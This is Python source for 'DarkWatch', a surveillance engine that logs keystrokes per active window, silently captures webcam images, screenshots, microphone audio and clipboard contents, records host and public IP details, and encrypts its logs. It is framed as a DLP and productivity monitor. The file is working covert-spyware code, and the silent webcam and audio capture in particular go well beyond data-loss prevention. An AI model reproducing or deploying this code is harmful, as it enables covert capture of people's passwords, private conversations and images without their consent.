"""
===================================================================
Project: DarkWatch - Intelligence & Telemetry Suite
Description: Multi-threaded engine for Active Window Keystroke Logging,
             Silent WebCamera Snaps, Screen Grabs, Audio Recording,
             Clipboard Capture, System Info, Log Encryption, and 
             Dynamic Module Toggling & Records Management.
===================================================================
"""

import os
import sys
import re
import time
import json
import socket
import shutil
import platform
import threading
from datetime import datetime

import requests
from pynput import keyboard
from dlp_scanner import DLPScannerService
from activity_tracker import WindowActivityTracker

# Platform-specific imports for Windows
IS_WINDOWS = sys.platform.startswith("win")
if IS_WINDOWS:
    try:
        import win32gui
        import win32clipboard
    except ImportError:
        pass

# Optional media libraries with graceful fallback
try:
    import cv2
    HAS_OPENCV = True
except ImportError:
    HAS_OPENCV = False

try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import sounddevice as sd
    from scipy.io.wavfile import write as wav_write
    HAS_AUDIO = True
except ImportError:
    HAS_AUDIO = False

try:
    from cryptography.fernet import Fernet
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


class KeyLoggerEngine:
    def __init__(self, config_path="config.json"):
        self.config_path = config_path
        self.config = self.load_config()
        self.log_dir = self.config.get("log_dir", "logs")
        self.ensure_directories()

        self.is_running = False
        self.current_window = ""
        self.key_buffer = []
        self.total_keystrokes = 0
        self.last_clipboard = ""
        self.listener = None
        self.worker_thread = None

        # Lock for safe thread access to files/buffers
        self.lock = threading.Lock()

        # Dynamic Modules State (Default: all true)
        config_modules = self.config.get("modules", {})
        self.modules_state = {
            "keystrokes": config_modules.get("keystrokes", True),
            "webcam": config_modules.get("webcam", True),
            "screenshots": config_modules.get("screenshots", True),
            "audio": config_modules.get("audio", True),
            "clipboard": config_modules.get("clipboard", True)
        }

        self.keys_log_path = os.path.join(self.log_dir, self.config.get("keys_info", "key_log.txt"))
        self.system_info_path = os.path.join(self.log_dir, self.config.get("system_info", "systeminfo.txt"))
        self.clipboard_log_path = os.path.join(self.log_dir, self.config.get("clipboard_info", "clipboard.txt"))
        self.screenshots_dir = os.path.join(self.log_dir, "screenshots")
        self.webcam_dir = os.path.join(self.log_dir, "webcam")
        self.audio_dir = os.path.join(self.log_dir, "audio")

        os.makedirs(self.screenshots_dir, exist_ok=True)
        os.makedirs(self.webcam_dir, exist_ok=True)
        os.makedirs(self.audio_dir, exist_ok=True)

        # Initialize Enterprise DLP Scanner Service
        dlp_cfg = self.config.get("dlp", {})
        default_dlp_keywords = set(dlp_cfg.get("keywords", ["confidential", "admin", "password", "secret", "restricted"]))
        self.dlp_scanner = DLPScannerService(keywords=default_dlp_keywords)

        # Initialize total keystrokes from existing persistent log
        self.total_keystrokes = self.count_keystrokes_from_log()

        # Initialize Window and Productivity Activity Tracker
        self.activity_tracker = WindowActivityTracker(poll_interval=1.0)

    def count_keystrokes_from_log(self):
        """Count recorded keystrokes from disk log file."""
        if not os.path.exists(self.keys_log_path):
            return 0
        try:
            with open(self.keys_log_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            if not content:
                return 0
            # Strip window headers
            text_clean = re.sub(r'\[ Window:.*?Time:.*?\]', '', content)
            # Count special formatted keys [CTRL_L], [ENTER], etc.
            special_keys = re.findall(r'\[[A-Z0-9_]+\]', text_clean)
            remaining = re.sub(r'\[[A-Z0-9_]+\]', '', text_clean)
            chars = [c for c in remaining if c not in ('\r', '\n')]
            return len(special_keys) + len(chars)
        except Exception:
            return 0

    def load_config(self):
        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception as e:
                print(f"[!] Error loading config.json: {e}")
        return {
            "author": "DarkWatch Core",
            "log_dir": "logs",
            "keys_info": "key_log.txt",
            "system_info": "systeminfo.txt",
            "clipboard_info": "clipboard.txt",
            "microphone_time_seconds": 10,
            "capture_interval_seconds": 30,
            "modules": {
                "keystrokes": True,
                "webcam": True,
                "screenshots": True,
                "audio": True,
                "clipboard": True
            }
        }

    def save_config(self):
        """Persist modules state back to config.json."""
        try:
            self.config["modules"] = self.modules_state
            with open(self.config_path, "w", encoding="utf-8") as f:
                json.dump(self.config, f, indent=2)
        except Exception as e:
            print(f"[!] Error saving config: {e}")

    def ensure_directories(self):
        os.makedirs(self.log_dir, exist_ok=True)

    def get_active_window(self):
        """Get title of currently active foreground window."""
        if IS_WINDOWS:
            try:
                hwnd = win32gui.GetForegroundWindow()
                if not hwnd or hwnd == 0:
                    WindowActivityTracker.attach_to_interactive_desktop()
                    hwnd = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(hwnd)
                return title.strip() if title else "Desktop / System"
            except Exception:
                return "Unknown Window"
        return platform.system() + " Window"

    def write_system_info(self):
        """Extract host and hardware diagnostics into systeminfo.txt."""
        try:
            hostname = socket.gethostname()
            try:
                local_ip = socket.gethostbyname(hostname)
            except Exception:
                local_ip = "127.0.0.1"

            try:
                pub_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
            except Exception:
                pub_ip = "Offline / Unavailable"

            sys_details = [
                "==================================================",
                f"            DARKWATCH - SYSTEM INFO               ",
                f"       Captured At: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "==================================================",
                f"Hostname        : {hostname}",
                f"Local IP        : {local_ip}",
                f"Public IP       : {pub_ip}",
                f"OS System       : {platform.system()} {platform.release()}",
                f"OS Version      : {platform.version()}",
                f"Architecture    : {platform.machine()}",
                f"Processor       : {platform.processor()}",
                f"Python Version  : {platform.python_version()}",
                "==================================================\n"
            ]

            with open(self.system_info_path, "w", encoding="utf-8") as f:
                f.write("\n".join(sys_details))
        except Exception as e:
            print(f"[!] System info extraction error: {e}")

    def on_key_press(self, key):
        """Callback for keyboard events."""
        if not self.is_running or not self.modules_state.get("keystrokes", True):
            return

        with self.lock:
            self.total_keystrokes += 1
            win_title = self.get_active_window()

            # Check if active window changed
            if win_title != self.current_window:
                self.current_window = win_title
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                header = f"\n\n[ Window: {self.current_window} | Time: {timestamp} ]\n"
                self.append_to_file(self.keys_log_path, header)

            # Format keystroke cleanly
            try:
                key_char = key.char
                if key_char is None:
                    key_str = f"[{str(key)}]"
                else:
                    key_str = key_char
            except AttributeError:
                if key == keyboard.Key.space:
                    key_str = " "
                elif key == keyboard.Key.enter:
                    key_str = "\n"
                elif key == keyboard.Key.tab:
                    key_str = "\t"
                elif key == keyboard.Key.backspace:
                    key_str = "[BACKSPACE]"
                else:
                    key_name = str(key).replace("Key.", "").upper()
                    key_str = f"[{key_name}]"

            self.append_to_file(self.keys_log_path, key_str)

            # Accumulate text buffer for DLP inspection
            if getattr(self, "dlp_scanner", None):
                if not hasattr(self, "_dlp_key_buffer"):
                    self._dlp_key_buffer = ""
                
                # Append printable chars, space, enter, tab, or backspace
                if len(key_str) == 1:
                    self._dlp_key_buffer += key_str
                elif key == keyboard.Key.space:
                    self._dlp_key_buffer += " "
                elif key == keyboard.Key.enter:
                    self._dlp_key_buffer += "\n"
                elif key == keyboard.Key.backspace:
                    if len(self._dlp_key_buffer) > 0:
                        self._dlp_key_buffer = self._dlp_key_buffer[:-1]
                
                # Keep sliding window of latest 200 typed characters
                if len(self._dlp_key_buffer) > 200:
                    self._dlp_key_buffer = self._dlp_key_buffer[-200:]

                # Submit the sliding buffer to background queue
                if len(self._dlp_key_buffer.strip()) >= 3:
                    self.dlp_scanner.submit_text(
                        self._dlp_key_buffer,
                        source=f"{self.current_window or 'Active App'}",
                        metadata={"window": self.current_window}
                    )

    def append_to_file(self, filepath, content):
        """Thread-safe append helper."""
        try:
            with open(filepath, "a", encoding="utf-8") as f:
                f.write(content)
        except Exception as e:
            print(f"[!] File append error ({filepath}): {e}")

    def check_clipboard(self):
        """Silently grab clipboard data if modified."""
        if not self.modules_state.get("clipboard", True):
            return
        if not IS_WINDOWS:
            return
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                win32clipboard.CloseClipboard()

                if data and data != self.last_clipboard:
                    self.last_clipboard = data
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    entry = f"[{timestamp}] Clipboard Copy:\n{data}\n----------------------------------------\n"
                    self.append_to_file(self.clipboard_log_path, entry)

                    # Submit clipboard to DLP scanner for inspection
                    if getattr(self, "dlp_scanner", None):
                        self.dlp_scanner.submit_text(
                            data,
                            source="Clipboard Copy",
                            metadata={"length": len(data)}
                        )
            else:
                win32clipboard.CloseClipboard()
        except Exception:
            pass

    def is_screen_available(self):
        """Check if Windows desktop display is active and unlocked."""
        if not IS_WINDOWS:
            return True
        try:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd:
                title = win32gui.GetWindowText(hwnd)
                if "LockApp" in title or "Windows Default Lock" in title:
                    return False
            return True
        except Exception:
            return True

    def trigger_screenshot(self):
        """Capture screen silently and save to screenshots folder with graceful lock handling."""
        if not self.modules_state.get("screenshots", True):
            return None
        if not HAS_PIL:
            return None
        
        # Don't spam if screen is locked or asleep
        if not self.is_screen_available():
            return None

        try:
            WindowActivityTracker.attach_to_interactive_desktop()
            img = ImageGrab.grab()
            if not img:
                return None

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            filepath = os.path.join(self.screenshots_dir, filename)
            img.save(filepath, "PNG")

            # Also maintain latest default screenshot for quick display
            latest_path = os.path.join(self.log_dir, self.config.get("screenshot_info", "screenshot.png"))
            img.save(latest_path, "PNG")

            # Reset error count on success
            self.screenshot_fail_count = 0
            return filepath
        except Exception as e:
            self.screenshot_fail_count = getattr(self, "screenshot_fail_count", 0) + 1
            # Only print warning occasionally instead of spamming thousands of times
            if self.screenshot_fail_count in [1, 5, 20]:
                print(f"[*] Screenshot capture notice: {e}")
            return None

    def trigger_webcam(self):
        """Capture webcam snap silently (no window popup)."""
        if not self.modules_state.get("webcam", True):
            return None
        if not HAS_OPENCV:
            return None
        try:
            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW if IS_WINDOWS else cv2.CAP_ANY)
            if not cam.isOpened():
                return None

            ret, frame = cam.read()
            cam.release()

            if ret and frame is not None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"webcam_{timestamp}.png"
                filepath = os.path.join(self.webcam_dir, filename)
                cv2.imwrite(filepath, frame)

                latest_path = os.path.join(self.log_dir, self.config.get("webcam_info", "webCamera.png"))
                cv2.imwrite(latest_path, frame)

                return filepath
        except Exception as e:
            print(f"[!] Webcam capture error: {e}")
        return None

    def trigger_audio(self):
        """Record audio clip from default microphone."""
        if not self.modules_state.get("audio", True):
            return None
        if not HAS_AUDIO:
            return None
        if getattr(self, "_recording_audio_active", False):
            return None
        self._recording_audio_active = True
        try:
            duration = self.config.get("microphone_time_seconds", 10)
            sample_rate = 44100
            recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
            sd.wait()

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"audio_{timestamp}.wav"
            filepath = os.path.join(self.audio_dir, filename)
            wav_write(filepath, sample_rate, recording)

            latest_path = os.path.join(self.log_dir, self.config.get("audio_info", "audio.wav"))
            wav_write(latest_path, sample_rate, recording)

            return filepath
        except Exception as e:
            print(f"[!] Audio recording error: {e}")
            return None
        finally:
            self._recording_audio_active = False

    def encrypt_logs(self, key_bytes=None):
        """Encrypt plain text logs using Fernet AES encryption."""
        if not HAS_CRYPTO:
            return False
        try:
            env_key = os.environ.get("DARKWATCH_ENCRYPTION_KEY")
            if env_key:
                key = env_key.strip().encode()
            elif key_bytes:
                key = key_bytes
            else:
                key_file = self.config.get("encryption", {}).get("key_file", "encryption_key.txt")
                if not os.path.exists(key_file):
                    key = Fernet.generate_key()
                    with open(key_file, "wb") as kf:
                        kf.write(key)
                else:
                    with open(key_file, "rb") as kf:
                        key = kf.read().strip()

            fernet = Fernet(key)
            files_to_encrypt = [self.keys_log_path, self.system_info_path, self.clipboard_log_path]

            for filepath in files_to_encrypt:
                if os.path.exists(filepath):
                    with open(filepath, "rb") as f:
                        plain_data = f.read()
                    if plain_data:
                        enc_data = fernet.encrypt(plain_data)
                        enc_path = os.path.join(self.log_dir, "enc_" + os.path.basename(filepath))
                        with open(enc_path, "wb") as f_out:
                            f_out.write(enc_data)
            return True
        except Exception as e:
            print(f"[!] Encryption error: {e}")
            return False

    def toggle_module(self, module_name, state=None):
        """Toggle or set specific module state (True/False)."""
        if module_name in self.modules_state:
            if state is None:
                self.modules_state[module_name] = not self.modules_state[module_name]
            else:
                self.modules_state[module_name] = bool(state)
            self.save_config()
            return self.modules_state[module_name]
        return None

    def clear_records(self, target="all"):
        """Delete captured records cleanly."""
        with self.lock:
            try:
                if target in ["keystrokes", "all"]:
                    if os.path.exists(self.keys_log_path):
                        with open(self.keys_log_path, "w", encoding="utf-8") as f:
                            f.write("")
                    self.total_keystrokes = 0

                if target in ["clipboard", "all"]:
                    if os.path.exists(self.clipboard_log_path):
                        with open(self.clipboard_log_path, "w", encoding="utf-8") as f:
                            f.write("")
                    self.last_clipboard = ""

                if target in ["screenshots", "all"]:
                    if os.path.exists(self.screenshots_dir):
                        for f in os.listdir(self.screenshots_dir):
                            fp = os.path.join(self.screenshots_dir, f)
                            if os.path.isfile(fp):
                                os.remove(fp)

                if target in ["webcam", "all"]:
                    if os.path.exists(self.webcam_dir):
                        for f in os.listdir(self.webcam_dir):
                            fp = os.path.join(self.webcam_dir, f)
                            if os.path.isfile(fp):
                                os.remove(fp)

                if target in ["audio", "all"]:
                    if os.path.exists(self.audio_dir):
                        for f in os.listdir(self.audio_dir):
                            fp = os.path.join(self.audio_dir, f)
                            if os.path.isfile(fp):
                                os.remove(fp)

                return True
            except Exception as e:
                print(f"[!] Error clearing records ({target}): {e}")
                return False

    def prune_old_records(self, max_files_per_category=150):
        """Auto-maintenance: keep disk space capped by pruning oldest files."""
        for directory in [self.screenshots_dir, self.webcam_dir, self.audio_dir]:
            if not os.path.exists(directory):
                continue
            try:
                files = [os.path.join(directory, f) for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
                if len(files) > max_files_per_category:
                    # Sort files by creation/modification time (oldest first)
                    files.sort(key=os.path.getmtime)
                    excess = len(files) - max_files_per_category
                    for i in range(excess):
                        try:
                            os.remove(files[i])
                        except Exception:
                            pass
            except Exception:
                pass

    def periodic_tasks(self):
        """Background routine running periodic snapshots & monitoring."""
        interval = self.config.get("capture_interval_seconds", 30)
        cycle_count = 0
        while self.is_running:
            try:
                if self.modules_state.get("clipboard", True):
                    self.check_clipboard()
                if self.modules_state.get("screenshots", True):
                    self.trigger_screenshot()
                if self.modules_state.get("webcam", True):
                    self.trigger_webcam()
                if self.modules_state.get("audio", True):
                    threading.Thread(target=self.trigger_audio, daemon=True).start()

                # Run storage retention maintenance every 50 cycles
                cycle_count += 1
                if cycle_count % 50 == 0:
                    self.prune_old_records()
            except Exception as e:
                print(f"[!] Background task error: {e}")

            # Sleep in small increments so stop signal is responsive
            for _ in range(interval):
                if not self.is_running:
                    break
                time.sleep(1)

    def start(self):
        """Start keylogger engine & background monitoring."""
        if self.is_running:
            return

        self.is_running = True
        self.write_system_info()

        # Start keyboard listener
        try:
            self.listener = keyboard.Listener(on_press=self.on_key_press)
            self.listener.start()
        except Exception as e:
            print(f"[!] Keyboard listener error: {e}")

        # Start periodic worker thread
        self.worker_thread = threading.Thread(target=self.periodic_tasks, daemon=True)
        self.worker_thread.start()

        # Start background window & activity tracker
        if hasattr(self, "activity_tracker") and self.activity_tracker:
            self.activity_tracker.start()

        print(f"[*] DarkWatch Engine started successfully.")

    def stop(self):
        """Stop keylogger engine gracefully."""
        self.is_running = False
        if self.listener:
            self.listener.stop()
        if getattr(self, "dlp_scanner", None):
            self.dlp_scanner.shutdown()
        if hasattr(self, "activity_tracker") and self.activity_tracker:
            self.activity_tracker.stop()
        print("[*] DarkWatch Engine stopped.")

    def get_stats(self):
        """Return engine metrics for Web Dashboard."""
        screenshots_count = len(os.listdir(self.screenshots_dir)) if os.path.exists(self.screenshots_dir) else 0
        webcam_count = len(os.listdir(self.webcam_dir)) if os.path.exists(self.webcam_dir) else 0
        audio_count = len(os.listdir(self.audio_dir)) if os.path.exists(self.audio_dir) else 0

        # Ensure total_keystrokes reflects actual log file count
        disk_keys = self.count_keystrokes_from_log()
        current_keys = max(self.total_keystrokes, disk_keys)
        self.total_keystrokes = current_keys

        # Fetch live DLP alert status
        dlp_status = {"alert_triggered": False, "matched_keywords": []}
        if getattr(self, "dlp_scanner", None):
            dlp_status = self.dlp_scanner.get_dashboard_alert_status()

        # Fetch live productivity & window tracking stats
        productivity_data = {
            "usage": {},
            "timeline": [],
            "current": {"app": "idle.exe", "title": "Desktop", "tab": ""},
            "chartjs": {"labels": [], "datasets": []}
        }
        if hasattr(self, "activity_tracker") and self.activity_tracker:
            productivity_data = {
                "usage": self.activity_tracker.get_app_usage(),
                "timeline": self.activity_tracker.get_timeline(15),
                "current": self.activity_tracker.get_current_focus(),
                "chartjs": self.activity_tracker.get_chartjs_payload()
            }

        return {
            "status": "Active" if self.is_running else "Paused",
            "author": self.config.get("author", "DarkWatch Core"),
            "total_keystrokes": current_keys,
            "active_window": self.current_window or self.get_active_window(),
            "screenshots_count": screenshots_count,
            "webcam_count": webcam_count,
            "audio_count": audio_count,
            "modules": self.modules_state,
            "dlp": dlp_status,
            "productivity": productivity_data,
            "last_updated": datetime.now().strftime("%H:%M:%S")
        }
